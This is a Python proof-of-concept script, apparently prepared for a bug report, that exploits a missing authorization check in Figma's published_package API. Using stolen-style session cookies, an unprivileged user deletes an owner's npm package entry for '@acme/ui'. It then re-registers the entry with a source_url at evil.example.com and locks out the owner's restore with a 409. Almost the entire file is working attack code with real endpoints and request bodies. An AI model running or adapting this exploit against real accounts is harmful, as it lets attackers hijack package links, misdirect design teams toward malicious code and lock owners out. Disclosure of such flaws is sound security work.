# -*- coding: utf-8 -*-
# 影响演示: A创建 -> B删除 -> B顶替(同名假source_url) -> A恢复被409锁死
import sys, json, io, asyncio
import requests, websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

FILE_KEY = "bv2nMIdFf4u3dESGail4sm"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
CKA = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip()
CKB = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()

HDR = {"Origin": "https://www.figma.com",
       "Referer": f"https://www.figma.com/file/{FILE_KEY}",
       "User-Agent": UA, "Content-Type": "application/json"}

def api(cookie, method, path, body=None):
    r = requests.request(method, f"https://www.figma.com{path}",
                         headers={**HDR, "Cookie": cookie},
                         json=body if body is not None else None, timeout=30)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, r.text[:200]

def lg_url():
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId=&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{FILE_KEY}"
            f"&connectionType=initial&reconnect=0")

def auth():
    return {"messageType": "auth", "clientType": "web",
            "args": {"userId": None, "anonymousUserId": None},
            "tags": {"clientType": "web", "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                     "clientUrl": f"https://www.figma.com/file/{FILE_KEY}"},
            "clientRequestedVersion": 2}

def pkg_list(cookie):
    try:
        return asyncio.run(_ws_pkgs(cookie))
    except Exception as e:
        return f"ERR {e}"

async def _ws_pkgs(cookie):
    async with websockets.connect(lg_url(),
                                  additional_headers={"User-Agent": UA, "Cookie": cookie,
                                                      "Origin": "https://www.figma.com"},
                                  max_size=50_000_000, open_timeout=15) as ws:
        await ws.send(json.dumps(auth()))
        for _ in range(3):
            msg = await asyncio.wait_for(ws.recv(), timeout=8)
            if isinstance(msg, str) and "authSuccess" in msg:
                break
        await ws.send(json.dumps({"messageType": "subscribe", "viewName":
            "ComponentBrowserSettingsSidebarPackagesNavigationStackView",
            "viewHash": "00000000000000000000000000000000",
            "loadType": "initial", "args": {"fileKey": FILE_KEY}}))
        for _ in range(6):
            msg = await asyncio.wait_for(ws.recv(), timeout=5)
            if isinstance(msg, str) and "publishedPackages" in msg:
                try:
                    j = json.loads(msg)
                    q = j["mutations"].get("[\"ComponentBrowserSettingsSidebarPackagesNavigationStackView\",{\"fileKey\":\"bv2nMIdFf4u3dESGail4sm\"}]", {})
                    return q.get("FilePublishedPackage", {}).get("queries", {}).get("[\"File\",\"publishedPackages\",[],[\"bv2nMIdFf4u3dESGail4sm\"]]", {}).get("initial", {})
                except Exception:
                    return msg[:300]
    return None

print("=== 场景:设计系统库的 npm 包注册表被第三方删除+顶替 ===\n")
print("1. A(owner) 注册正式包 @acme/ui (source_url=真实仓库)")
st, j = api(CKA, "POST", f"/api/files/{FILE_KEY}/published_package",
            {"package_identifier": "@acme/ui", "package_type": "npm",
             "source_url": "https://github.com/acme/ui"})
print(f"   A create: {st} id={j.get('meta',{}).get('id') if isinstance(j,dict) else '?'}")
pkg_id = j.get("meta", {}).get("id") if isinstance(j, dict) else None

print("\n2. A 视角确认已生效(livegraph)")
print("   A sees:", pkg_list(CKA))

print("\n3. B(无任何权限) 删除 A 的正式包")
if pkg_id:
    st, j = api(CKB, "DELETE", f"/api/files/{FILE_KEY}/published_package/{pkg_id}")
    print(f"   B delete: {st} {j}")

print("\n4. A 视角:包已消失")
print("   A sees:", pkg_list(CKA))

print("\n5. B 立即顶替:同名 identifier + 恶意 source_url")
st, j = api(CKB, "POST", f"/api/files/{FILE_KEY}/published_package",
            {"package_identifier": "@acme/ui", "package_type": "npm",
             "source_url": "https://evil.example.com/acme-ui-fork"})
print(f"   B create evil twin: {st} meta={j.get('meta') if isinstance(j,dict) else j}")

print("\n6. A 试图恢复正式包 -> 被 409 锁死")
st, j = api(CKA, "POST", f"/api/files/{FILE_KEY}/published_package",
            {"package_identifier": "@acme/ui", "package_type": "npm",
             "source_url": "https://github.com/acme/ui"})
print(f"   A restore: {st} {j}")

print("\n7. 清理现场")
pkgs = pkg_list(CKA)
if isinstance(pkgs, dict):
    for pid, val in pkgs.items():
        st, j = api(CKA, "DELETE", f"/api/files/{FILE_KEY}/published_package/{pid}")
        print(f"   cleanup {pid}: {st}")
print("   final:", pkg_list(CKA))
